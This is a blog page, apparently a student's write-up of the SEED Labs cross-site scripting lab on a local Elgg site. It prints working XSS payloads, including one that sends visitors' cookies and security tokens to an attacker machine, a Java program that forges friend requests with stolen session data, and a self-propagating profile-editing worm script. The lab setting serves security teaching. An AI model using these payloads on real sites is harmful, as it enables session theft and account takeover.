@@ -1,0 +1,851 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="true" />
+
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="true" />
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="网络,seed," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="PCB博客" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="环境配置： 启动apache2服务：sudo service apache2 start 配置Apache服务，在/etc/apache2/sites-available/default中，配置如下：  实验内容：Task 1:显示Alert窗口在用户名boby下的修改信息这一网页中，在个人说明中插入alert信息： &amp;lt;script&amp;gt;alert(‘XSS’);&amp;lt;/script&amp;g">
+<meta name="keywords" content="网络,seed">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SeedLab:Web XSS">
+<meta property="og:url" content="http://bin2415.github.io/2017/05/16/xss/index.html">
+<meta property="og:site_name" content="PCB博客">
+<meta property="og:description" content="环境配置： 启动apache2服务：sudo service apache2 start 配置Apache服务，在/etc/apache2/sites-available/default中，配置如下：  实验内容：Task 1:显示Alert窗口在用户名boby下的修改信息这一网页中，在个人说明中插入alert信息： &amp;lt;script&amp;gt;alert(‘XSS’);&amp;lt;/script&amp;g">
+<meta property="og:image" content="http://i.imgur.com/5pqUZOD.png">
+<meta property="og:image" content="http://i.imgur.com/N9cIcKG.png">
+<meta property="og:image" content="http://i.imgur.com/y1OoHxo.png">
+<meta property="og:image" content="http://i.imgur.com/k7CaLZX.png">
+<meta property="og:image" content="http://i.imgur.com/kqdzKtD.png">
+<meta property="og:image" content="http://i.imgur.com/IMb4qmJ.png">
+<meta property="og:image" content="http://i.imgur.com/ga3JzGq.png">
+<meta property="og:image" content="http://i.imgur.com/QyziMTx.png">
+<meta property="og:image" content="http://i.imgur.com/xcXiUaH.png">
+<meta property="og:image" content="http://i.imgur.com/pdgq8iN.png">
+<meta property="og:image" content="http://i.imgur.com/M9o46Az.png">
+<meta property="og:image" content="http://i.imgur.com/1YGba3O.png">
+<meta property="og:image" content="http://i.imgur.com/8WasNN3.png">
+<meta property="og:image" content="http://i.imgur.com/5dT7ZdX.png">
+<meta property="og:image" content="http://i.imgur.com/kbNBloR.png">
+<meta property="og:image" content="http://i.imgur.com/Kdcs3Mt.png">
+<meta property="og:image" content="http://i.imgur.com/XO3lsaV.png">
+<meta property="og:image" content="http://i.imgur.com/UXlx68J.png">
+<meta property="og:image" content="http://i.imgur.com/PqDend5.png">
+<meta property="og:image" content="http://i.imgur.com/c9FX8Pl.png">
+<meta property="og:image" content="http://i.imgur.com/DSi5QVq.png">
+<meta property="og:image" content="http://i.imgur.com/WEYBOkh.png">
+<meta property="og:image" content="http://i.imgur.com/1OUoH74.png">
+<meta property="og:updated_time" content="2017-05-16T10:20:48.458Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SeedLab:Web XSS">
+<meta name="twitter:description" content="环境配置： 启动apache2服务：sudo service apache2 start 配置Apache服务，在/etc/apache2/sites-available/default中，配置如下：  实验内容：Task 1:显示Alert窗口在用户名boby下的修改信息这一网页中，在个人说明中插入alert信息： &amp;lt;script&amp;gt;alert(‘XSS’);&amp;lt;/script&amp;g">
+<meta name="twitter:image" content="http://i.imgur.com/5pqUZOD.png">
+
+<meta name="google-site-verification" content="6X0VEc7S4OCLuVOpAVhTrqQS6qCLzeJWET8siPhU0IE" />
+
+<meta name="baidu-site-verification" content="isB2Nn53Ug" />
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://bin2415.github.io/2017/05/16/xss/"/>
+
+
+
+
+
+  <title>SeedLab:Web XSS | PCB博客</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', '[object Object]', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner">
+
+<div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">PCB博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">快乐记录每一天</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2017/05/16/xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="binpang">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PCB博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SeedLab:Web XSS</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-16T18:18:48+08:00">
+                2017-05-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络/" itemprop="url" rel="index">
+                    <span itemprop="name">网络</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="环境配置："><a href="#环境配置：" class="headerlink" title="环境配置："></a>环境配置：</h2><ul>
+<li>启动apache2服务：sudo service apache2 start</li>
+<li>配置Apache服务，在/etc/apache2/sites-available/default中，配置如下：<br><img src="http://i.imgur.com/5pqUZOD.png" alt=""></li>
+</ul>
+<h2 id="实验内容："><a href="#实验内容：" class="headerlink" title="实验内容："></a>实验内容：</h2><h3 id="Task-1-显示Alert窗口"><a href="#Task-1-显示Alert窗口" class="headerlink" title="Task 1:显示Alert窗口"></a>Task 1:显示Alert窗口</h3><p>在用户名boby下的修改信息这一网页中，在个人说明中插入alert信息：</p>
+<pre><code>&lt;script&gt;alert(‘XSS’);&lt;/script&gt;
+</code></pre><p>如下图所示:</p>
+<p><img src="http://i.imgur.com/N9cIcKG.png" alt=""></p>
+<p>登陆用户名bin，然后查看boby的信息，结果如下，会弹出一个窗口，结果如下：</p>
+<p><img src="http://i.imgur.com/y1OoHxo.png" alt=""></p>
+<p>将恶意内容放入js文件中，然后把链接指向js文件，具体指令如下：</p>
+<p><img src="http://i.imgur.com/k7CaLZX.png" alt=""></p>
+<p>attack.js文件的内容如下,将该文件放入xss.lagelgg.com的根目录下(/var/www/XSS/elgg/)</p>
+<p><img src="http://i.imgur.com/kqdzKtD.png" alt=""></p>
+<p>bin用户访问boby用户的信息时，攻击成功：</p>
+<p><img src="http://i.imgur.com/IMb4qmJ.png" alt=""></p>
+<h3 id="Task2-展示用户的cookie信息"><a href="#Task2-展示用户的cookie信息" class="headerlink" title="Task2:展示用户的cookie信息"></a>Task2:展示用户的cookie信息</h3><p>在boby用户信息的编写框中输入如下攻击信息:</p>
+<pre><code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+</code></pre><p><img src="http://i.imgur.com/ga3JzGq.png" alt=""></p>
+<p>然后bin用户查看boby用户的信息时，出现如下弹框:</p>
+<p><img src="http://i.imgur.com/QyziMTx.png" alt=""></p>
+<h3 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3:"></a>Task 3:</h3><p>在boby用户信息的编写框中输入如下攻击信息(其中192.168.47.181为攻击中机器的ip地址):</p>
+<pre><code>&lt;script&gt;document.write(&apos;&lt;img src =http://192.168.47.181:5555?c=&apos;+escape(document.cookie) + &apos; &gt;&apos;);&lt;/script&gt;
+</code></pre><p><img src="http://i.imgur.com/xcXiUaH.png" alt=""></p>
+<p>然后在攻击者机器中运行echoserv文件，让它监听5555端口，当bin用户查看boby的用户信息的时候，bin用户的cookie信息被发送到攻击者的机器上：</p>
+<p><img src="http://i.imgur.com/pdgq8iN.png" alt=""></p>
+<h3 id="Task4-用偷来的Cookie来进行会话攻击"><a href="#Task4-用偷来的Cookie来进行会话攻击" class="headerlink" title="Task4:用偷来的Cookie来进行会话攻击"></a>Task4:用偷来的Cookie来进行会话攻击</h3><p>首先在boby的用户信息编写框中输入如下信息:</p>
+<pre><code>&lt;script&gt;document.write(&apos;&lt;img src=http://127.0.0.1:5555?c=&apos;+escape(document.cookie)+&apos;&amp;&apos;+elgg.security.token.__elgg_ts+&apos;&amp;&apos;+elgg.security.token.__elgg_token+&apos;  &gt;&apos;);&lt;/script&gt;
+</code></pre><p>该js脚本的作用就是将访问boby用户信息的用户的cookie和<strong>elgg_ts,</strong>elgg_token信息发送到攻击者机器。</p>
+<p><img src="http://i.imgur.com/M9o46Az.png" alt=""></p>
+<p>用LiveHttpHeaders工具来查看加好友的包的情况：</p>
+<p><img src="http://i.imgur.com/1YGba3O.png" alt=""></p>
+<p>根据抓的包的信息来完成程序的构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">import java.net.*;</div><div class="line">import java.io.*;</div><div class="line">public class HTTPSimpleForge &#123;</div><div class="line">       public static void main(String[] args) throws IOException &#123;</div><div class="line">       try &#123;</div><div class="line">             int responseCode;</div><div class="line">             InputStream responseIn=null;</div><div class="line">             // URL to be forged.</div><div class="line">             URL url = new URL (&quot;http://www.xsslabelgg.com/action/friends/add?friend=41&amp;__elgg_ts=1464013312&amp;__elgg_token=c2aa7157f41d7d265d4f082aa0b03b4f&quot;);</div><div class="line">             URLConnection urlConn = url.openConnection();</div><div class="line">             if (urlConn instanceof HttpURLConnection) &#123;</div><div class="line">                    urlConn.setConnectTimeout(60000);</div><div class="line">                    urlConn.setReadTimeout(90000);</div><div class="line">             &#125;</div><div class="line">     urlConn.addRequestProperty(&quot;Host&quot;,&quot;www.xsslabelgg.com&quot;);</div><div class="line">     urlConn.addRequestProperty(&quot;User-Agent&quot;,&quot;Sun JDK 1.6&quot;);</div><div class="line">     urlConn.setRequestProperty(&quot;Accept&quot;,&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;);</div><div class="line">     urlConn.setRequestProperty(&quot;Accept-Language&quot;,&quot;en-us,en;q=0.5&quot;);</div><div class="line">     urlConn.setRequestProperty(&quot;Accept-Encoding&quot;,&quot;gzip,deflate&quot;);</div><div class="line">     urlConn.setRequestProperty(&quot;Referer&quot;,&quot;http://www.xsslabelgg.com/profile/charlie&quot;);</div><div class="line">     urlConn.setRequestProperty(&quot;Cookie&quot;,&quot;Elgg=rpmo7shdmq6b6kdg38o76oo3j5&quot;);</div><div class="line">     urlConn.setRequestProperty(&quot;Connection&quot;,&quot;keep-alive&quot;);</div><div class="line">             urlConn.setDoOutput(true);</div><div class="line">             String data=&quot;username=charlie&amp;seed=charlie@seed.com&quot;;</div><div class="line">             OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());</div><div class="line">             wr.write(data);</div><div class="line">             wr.flush();</div><div class="line">              // HttpURLConnection a subclass of URLConnection is returned by</div><div class="line">              // url.openConnection() since the url is an http request.</div><div class="line">              if (urlConn instanceof HttpURLConnection) &#123;</div><div class="line">                     HttpURLConnection httpConn = (HttpURLConnection) urlConn;</div><div class="line">                     // Contacts the web server and gets the status code from</div><div class="line">                     // HTTP Response message.</div><div class="line">                     responseCode = httpConn.getResponseCode();</div><div class="line">                     System.out.println(&quot;Response Code = &quot; + responseCode);</div><div class="line">                     // HTTP status code HTTP_OK means the response was</div><div class="line">                     // received sucessfully.</div><div class="line">                     if (responseCode == HttpURLConnection.HTTP_OK) &#123;</div><div class="line">                            // Get the input stream from url connection object.</div><div class="line">                            responseIn = urlConn.getInputStream();</div><div class="line">                            // Create an instance for BufferedReader</div><div class="line">                            // to read the response line by line.</div><div class="line">                            BufferedReader buf_inp = new BufferedReader(</div><div class="line">                            new InputStreamReader(responseIn));</div><div class="line">                            String inputLine;</div><div class="line">                            while((inputLine = buf_inp.readLine())!=null) &#123;</div><div class="line">                                   System.out.println(inputLine);</div><div class="line">                            &#125;</div><div class="line">                     &#125;</div><div class="line">              &#125;</div><div class="line">       &#125; catch (MalformedURLException e) &#123;</div><div class="line">              e.printStackTrace();</div><div class="line">       &#125;</div><div class="line">       &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>更改攻击者机器的/etc/hosts文件,使其修改/etc/hosts文件：<br>将www.xsslabelgg.com的ip地址改为192.168.47.185（受害者机器的ip）<br><img src="http://i.imgur.com/8WasNN3.png" alt=""></p>
+<p>在受害者机器上登入samy用户,首先查看samy的好友情况，可知现在samy没有好友:</p>
+<p><img src="http://i.imgur.com/5dT7ZdX.png" alt=""></p>
+<p>Samy查看boby的信息，其cookie信息，cookie和<strong>elgg_ts,</strong>elgg_token信息都发回了攻击者机器：</p>
+<p><img src="http://i.imgur.com/kbNBloR.png" alt=""></p>
+<p>将编写的攻击程序的cookie，<strong>elgg_ts,</strong>elgg_token等信息填充好，编译程序Javac HTTPSimpleForge.java，然后运行java HTTPSimpleForge,收到html的返回信息：</p>
+<p><img src="http://i.imgur.com/Kdcs3Mt.png" alt=""></p>
+<p>可知结果为200，查看samy的好友信息如下：</p>
+<p><img src="http://i.imgur.com/XO3lsaV.png" alt=""></p>
+<p>可知攻击成功。</p>
+<h3 id="Task-5：写一个XSS蠕虫"><a href="#Task-5：写一个XSS蠕虫" class="headerlink" title="Task 5：写一个XSS蠕虫"></a>Task 5：写一个XSS蠕虫</h3><p>首先登陆boby用户，修改用户信息，查看包的情况如下：</p>
+<p><img src="http://i.imgur.com/UXlx68J.png" alt=""></p>
+<p>根据包的情况编写worm.js程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">var nod = document.getElementsByClassName(&quot;elgg-border-plain elgg-transition&quot;);</div><div class="line">var user = nod[0].attributes.getNamedItem(&quot;alt&quot;).nodeValue;</div><div class="line">if(user != &apos;Boby&apos;)</div><div class="line">&#123;</div><div class="line">var Ajax=null;</div><div class="line">// Construct the header information for the HTTP request</div><div class="line">Ajax=new XMLHttpRequest();</div><div class="line">if(Ajax == null)</div><div class="line">	alert(&quot;Ajax is null&quot;);</div><div class="line">Ajax.open(&quot;POST&quot;,&quot;http://www.xsslabelgg.com/action/profile/edit&quot;,true);</div><div class="line">Ajax.setRequestHeader(&quot;Host&quot;,&quot;www.xsslabelgg.com&quot;);</div><div class="line">Ajax.setRequestHeader(&quot;User-Agent&quot;,&quot;AJAX 1.2&quot;);</div><div class="line">Ajax.setRequestHeader(&quot;Accept&quot;,&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;);</div><div class="line">Ajax.setRequestHeader(&quot;Accept-Language&quot;,&quot;en-US,en;q=0.5&quot;);</div><div class="line">Ajax.setRequestHeader(&quot;Accept-Encoding&quot;,&quot;gzip,deflate&quot;);</div><div class="line">var node = document.getElementsByClassName(&quot;elgg-border-plain elgg-transition&quot;);</div><div class="line">var username = node[0].attributes.getNamedItem(&quot;alt&quot;).nodeValue;</div><div class="line">Ajax.setRequestHeader(&quot;Refer&quot;,&quot;http://www.xsslabelgg.com/profile/&quot;+username+&quot;/edit&quot;);</div><div class="line">Ajax.setRequestHeader(&quot;Keep-Alive&quot;,&quot;300&quot;);</div><div class="line">Ajax.setRequestHeader(&quot;Connection&quot;,&quot;keep-alive&quot;);</div><div class="line">Ajax.setRequestHeader(&quot;Cookie&quot;,document.cookie);</div><div class="line">Ajax.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);</div><div class="line">// Construct the content. The format of the content can be learned</div><div class="line">// from LiveHTTPHeaders.</div><div class="line">var content = &quot;__elgg_token=&quot;+elgg.security.token.__elgg_token+&quot;&amp;__elgg_ts=&quot;+elgg.security.token.__elgg_ts+&quot;&amp;name=&quot;+username+&quot;&amp;description=I&apos;m stupid&amp;guid=&quot;+elgg.session.user.guid;</div><div class="line">Ajax.setRequestHeader(&quot;Content-Length&quot;,content.length);</div><div class="line">// Send the HTTP POST request.</div><div class="line">Ajax.send(content);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>现在在boby的profile中添加worm:</p>
+<p><img src="http://i.imgur.com/PqDend5.png" alt=""></p>
+<p>更改完毕：</p>
+<p><img src="http://i.imgur.com/c9FX8Pl.png" alt=""></p>
+<p>现在以samy的身份登入，首先查看一下samy的信息，发现什么都没有描述：</p>
+<p><img src="http://i.imgur.com/DSi5QVq.png" alt=""></p>
+<p>然后其访问boby的个人信息：</p>
+<p><img src="http://i.imgur.com/WEYBOkh.png" alt=""></p>
+<p>再次查看自己的信息：</p>
+<p><img src="http://i.imgur.com/1OUoH74.png" alt=""></p>
+<p>攻击成功。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/网络/" rel="tag"># 网络</a>
+          
+            <a href="/tags/seed/" rel="tag"># seed</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/05/16/remote-dns-attack/" rel="next" title="SeedLab:Remote DNS Attack">
+                <i class="fa fa-chevron-left"></i> SeedLab:Remote DNS Attack
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="binpang" />
+          <p class="site-author-name" itemprop="name">binpang</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境配置："><span class="nav-number">1.</span> <span class="nav-text">环境配置：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验内容："><span class="nav-number">2.</span> <span class="nav-text">实验内容：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-1-显示Alert窗口"><span class="nav-number">2.1.</span> <span class="nav-text">Task 1:显示Alert窗口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task2-展示用户的cookie信息"><span class="nav-number">2.2.</span> <span class="nav-text">Task2:展示用户的cookie信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-3"><span class="nav-number">2.3.</span> <span class="nav-text">Task 3:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task4-用偷来的Cookie来进行会话攻击"><span class="nav-number">2.4.</span> <span class="nav-text">Task4:用偷来的Cookie来进行会话攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-5：写一个XSS蠕虫"><span class="nav-number">2.5.</span> <span class="nav-text">Task 5：写一个XSS蠕虫</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">binpang</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
